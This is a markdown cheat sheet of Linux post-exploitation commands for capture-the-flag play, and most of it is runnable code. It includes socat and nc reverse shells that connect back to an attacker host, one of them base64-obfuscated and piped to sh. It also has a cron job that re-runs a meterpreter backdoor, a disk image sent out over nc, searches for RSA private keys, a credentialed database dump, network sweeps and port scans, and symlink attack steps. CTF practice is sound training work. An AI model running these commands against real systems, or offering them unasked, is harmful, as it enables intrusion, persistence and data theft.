# Command line scripts for CTF's

## Linux 

### Improve shell
- Improve the prompt:

```shell
bash -i
```

- Enable history (on a ssh server)

```bash
bash -i;
DIR=`mktemp -d /tmp/ctf_XXX`
cd "${DIR}"
export HISTFILE=`pwd`/.bash_history
set -o history
```

#### Real tty, through socat

__reverse_client__:
```shell
LHOST="<IP>"
LPORT="<PORT>"
cd /tmp
curl https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat -o socat
chmod u+rwx socat
./socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}
```

__server (LHOST)__:
```
socat file:`tty`,raw,echo=0 tcp-listen:8881
```

#### Reverse shell handler (multi window/pane)

- Multi window server
    + Requires: `tmux` and `ncat`

__Reverse shell server__:
```shell
PORT=4444
ncat -lkv -v "${PORT}" -c "
        s=\$(mktemp -u -d `pwd`/socket.\${NCAT_REMOTE_ADDR}.\${NCAT_REMOTE_PORT}.XXX);
        # tmux new-window \"ncat -lU \$s; read\";
        tmux split-window -h \"ncat -lU \$s; read\";
        sleep 1;
        ncat -U \$s;
        rm \$s;"
```

### Whoami?

- Whats my user, what are my groups?
    + Check if you are for example if you are a:
        * Member of `disk` => read the raw disk!
        * Member of `lxd` or `docker` => create a container mounting the root partition.
        * Member of `adm` => read log files for more information.

```bash
id
```

- What are all the users?
    + Check if there are any interesting users
```bash
cat /etc/passwd
```

- What are all the groups?
    + Are there any interesting groups? Who is a member
```bash
cat /etc/group
```

- What are the capabilities of this proces?

```bash
cat /proc/self/status | grep CapEff | cut -f2 | xargs -i capsh --decode={}
```

### What sort of release

- What sort of machine is this?

```bash
uname -a
cat /etc/issue
cat /etc/lsb-release
cat /etc/motd
```

- Use searchsploit to look for Kernel / Distibution exploits

```bash
searchsploit 16.04
searchsploit Ubuntu
```

### PTY

```bash
/usr/bin/python -c 'import pty; pty.spawn("/bin/sh")'
/usr/bin/python2 -c 'import pty; pty.spawn("/bin/sh")'
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### Sudo

- Check if we can see `sudo` permissions

```bash
sudo -l
cat /etc/sudoers
cat /etc/sudoers.d/*
```

### Keep shell

- Schedule your connect back exploit

```bash
BACKDOOR='/tmp/meterpreter'; (crontab -l 2>/dev/null; echo "*/1 * * * * ${BACKDOOR}") | crontab -
```
### nc (without -e) shell

```bash
IP=10.0.0.1;PORT=12345;PIPE=$(mktemp -u);mkfifo ${PIPE};cat ${PIPE}|/bin/sh -i 2>&1|nc ${IP} ${PORT} > ${PIPE}
```

- Or as base64

```bash
echo SVA9MTAuMC4wLjE7UE9SVD0xMjM0NTtta2ZpZm8gL3RtcC9maWZvO2NhdCAvdG1wL2ZpZm98L2Jpbi9zaCAtaSAyPiYxfG5jICR7SVB9ICR7UE9SVH0gPiAvdG1wL2ZpZm8= | base64 -d | sh
```

### Priv ESC?

- Checkout: 
    - https://gtfobins.github.io/
    - https://github.com/rebootuser/LinEnum
    - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

### Finding

- Manual (additional labour):

```bash
#!/bin/bash

BREAK="#------------------------------#"

EXCLUDED=(
    '^/sys' 
    '^/proc' 
    '^/usr/share'
    '^/var/lib'
    '/include/'
    '^/var/lib/dpkg/' 
    '^/usr/src/linux-headers-' 
    '^/var/cache/man/' 
    '^/var/cache/apt/archives/'
    '^/etc/fonts/'
    '^/usr/share/fonts/'
    '^/usr/share/icons/'
    '^/usr/share/man/'
    '^/lib/modules/'
    )
EXCLUDED=$( IFS=$'|'; echo "${EXCLUDED[*]}" )

echo "# SUID files:"
echo "${BREAK}"
find / -perm -4000 -type f 2>/dev/null | grep -Ev "${EXCLUDED[*]}" | xargs -L 1 ls -alhtr

echo "# Find files with added capabilities"
echo "${BREAK}"
getcap -r /* 2>/dev/null

echo "# Writable files:"
echo "${BREAK}"
find / -writable -type f 2>/dev/null | grep -Ev "${EXCLUDED[*]}" | xargs -L 1 ls -alhtr 

echo "# Readable files:"
echo "${BREAK}"
find / -readable -type f 2>/dev/null | grep -Ev "${EXCLUDED[*]}" | xargs -L 1 ls -alhtr 

echo "# Writeable socket files:"
echo "${BREAK}"
find / -type s -writable 2>/dev/null

echo "# Hidden files:"
echo "${BREAK}"
find / -name ".*" -ls 2>/dev/null | grep -vE ' /sys/| /proc/'

echo "# Cronjob files:"
echo "${BREAK}"
find /etc/cron* -ls 2>/dev/null
crontab -l

echo "# Find RSA private key files:"
echo "${BREAK}"
grep -Hnr '\-----BEGIN RSA PRIVATE KEY-----' /etc/ /home /root /var 2>/dev/null

echo "# Find git repositories"
echo "${BREAK}"
find / -type d -name '.git' -ls 2>/dev/null

echo "# Find git repositories, with historic RSA private keys files"
echo "${BREAK}"
find / -name .git | (while read gitdir; do echo ${gitdir}; (git --git-dir "${gitdir}" log -p | grep '\-----BEGIN RSA PRIVATE KEY-----'  ); done)
```

- Search for configuration/credentials in the web folder `/var/www/html`

### Finding files not in packages (dpkg based)

```shell
DIR=`mktemp -d`
cd $DIR
dpkg-query -W -f='${Package}\n' | xargs dpkg -L | sort -u > package_files
find / -type f 2>/dev/null | grep -v /proc/ | grep -v /sys/ | grep -v /dev/ | grep -v /boot/ | grep -vE /run/ | sort -u > find_files
awk 'FNR==NR{ array[$0];next}
 { if ( $1 in array ) next
   print $1}
' "package_files" "find_files" | less
```
### Finding loaded kernel module files

```shell
lsmod | awk '{print $1}' | xargs  modinfo | grep filename | awk '{print $2}'
```

### Finding vulnerable packages

- Create an account on https://vulners.com/
- Login
- Go to *Products* (top) -> *Audit*
- Go to *Manual Audit*
- Follow the instructions

### SQL 

- Dump SQL database using credentials
    + Notice the password is attached to the `-p` parameter
    + Notice the locking is disabled

```bash
USERNAME=admin
PASSWORD=mysqld4tb4s3p4ssw0rd
mysqldump --all-databases -u "${USERNAME}" -p"${PASSWORD}" --lock-tables=false > /tmp/mysqldump.sql
```

- Search for credentials in the dump

### Process monitoring (cronjobs)

- List all processes
```bash
ps auxw
```

- Monitor the processes:

```bash
#!/bin/bash

PSCMD="ps -eo user,command"
PREVPROC=$(eval $PSCMD)

#loop by line
IFS=$'\n'

while true; do
    CURPROC=$(eval $PSCMD)
    diff <(echo "$PREVPROC") <(echo "$CURPROC")
    PREVPROC=$CURPROC
done
```

- Alternative:

```bash
#!/bin/bash

PSCMD="ps --no-headers -eo user,command | sort -u"
echo "${PSCMD}"
eval "${PSCMD}"
PROC1=$(eval ${PSCMD})

echo "${PROC1}"

while true; do
    PROC2=$(eval ${PSCMD})
    PROC2=$(echo "${PROC1}"$'\n'"${PROC2}" | sort -u)
    diff <(echo "$PROC1") <(echo "$PROC2")
    PROC1=$PROC2
    echo "${PROC1}" > procs.txt
done
```

### Network recon

- Investigate the network

```bash
# Configuration of interfaces
cat /etc/network/interfaces
cat /etc/network/interfaces.d/*
#  Interfaces and addresses 
/sbin/ifconfig -a
/sbin/ip addr
#  Routing 
/sbin/route -n
/sbin/ip route
# Routing alternative view
cat /proc/self/net/fib_trie
# Neigbours
/sbin/ip neigh
/usr/sbin/arp -an
# Listening connections
netstat -tulpn
ss -tulpn
# All connections
netstat -pn
ss -pn
```

- Ping sweep
    + Use this sweep on the local network to see if the ARP table show new neigbours
    + Specify the correct rang

```bash
RANGE=192.168.122
for i in $(seq 1 254); do ping -c1 -w1 ${RANGE}.${i} & done
sleep 10
arp -an | grep -v incomplete | sed 's/.*(\(.*\)).*/\1/g' | grep "${RANGE}"
```

- Ping sweep IPv6

```bash
INTERFACE=eth0
ping6 -c 4 ff02::1%${INTERFACE}
sleep 2
ip neigh
```

- Scan a host using `nc`

```bash
IP=192.168.122.1
nc -zv ${IP} 1-65535 2>&1 | grep -v refused
```

- Sweep and scan, combining the above

```bash
RANGE=192.168.122
PERHOSTTIMEOUT=$((2*60))
PERPORTTIMEOUT=$((1*1))
for i in $(seq 1 254); do (ping -c1 -w1 ${RANGE}.${i} >/dev/null 2>&1 &); done
sleep 10
IPS=$(arp -an | grep -v incomplete | sed 's/.*(\(.*\)).*/\1/g' | grep "${RANGE}")
for IP in $IPS
do
  echo "[+] Scanning: ${IP}"
  timeout "${PERHOSTTIMEOUT}" nc -zvw ${PERPORTTIMEOUT} ${IP} 1-65535 2>&1 | grep -vE 'refused|timed out'
  echo "[+] Done: ${IP}"
done
```

### Copy files to a shell

- Use base64 from the terminal:

__source__
```shell
FILE=/tmp/source_file
cat "${FILE}" | base64 -w 0
# Or compressed
cat "${FILE}" | gzip | base64 -w 0
```

- Copy the base64 output

__destination__
```shell
OUTPUTFILE=/tmp/output
echo PASTEBASE64 | base64 -d > "${OUTPUTFILE}"
# Or compressed
echo PASTEBASE64 | gunzip | base64 -d > "${OUTPUTFILE}"
```

- Transport a disk image through ssh

```bash
ssh username@10.10.10.1 'dd if=/dev/sda1 | gzip -1 -' | dd of=image.gz
```

- Or through nc

__source__
```
dd if=/dev/mapper/machine-vg-root | gzip -1 - | nc 10.10.14.1 1234
```

__destination__
```
nc -vl 1234 | gunzip > filesystem.raw
```

- Upload through meterpreter 

```
meterpreter > /tmp/upload /tmp/myupload
```

### PROC

- What can we see in `/proc`

- The memory mapping; where is the stack, where are the binaries, where is the heap?
```bash
cat /proc/self/maps

# Or from other processes:
MIN=1
MAX=4000
for i in $(seq $MIN $MAX); do cat /proc/${i}/maps 2>/dev/null && echo That was process: ${i} ; done
```

- Find the command line arguments of processes, without ps

```bash
cat /proc/self/cmdline

# Or from other processes:
MIN=1
MAX=4000
for i in $(seq $MIN $MAX); do (cat /proc/${i}/cmdline 2>/dev/null | sed 's/\x00/ /g' | sed 's/$/\n/g' ) ; done
```

### Symlink attacks

- Found a job that overwrites using `root` or another user? Try to find symlink attacks.
- Example: 
    + root copies `/src` to `/dst` and places permission on `/dst`
    + we have write privileges on `/dst`
    + we can try to rm `/dst` and `ln -s /src /dst`
    + Once the root job fires, root will overwrite `/src` with itself (fails) and give write perms on `/src`
    + Now we control `/src` we can define what we copy where? 
    + For instance `ln -s /root/root.flag /src` and `rm /dst; mkdir /dst`
    + THe flag will now be copied to `/dst`

### Tunneling

- We can tunnel through an ssh connection, in this example:
    + Once ssh is connected, connecting to localhost:4444 will port forward through the ssh connection to 192.168.122.1:80
```bash
LPORT=4444
RHOST=192.168.122.1
RPORT=80
ssh user@10.10.10.1 -L $LPORT:$RHOST:$RPORT
```

- Meterpreter
```
portfwd add -l 4444 -r 192.168.122.1 -p 80
```
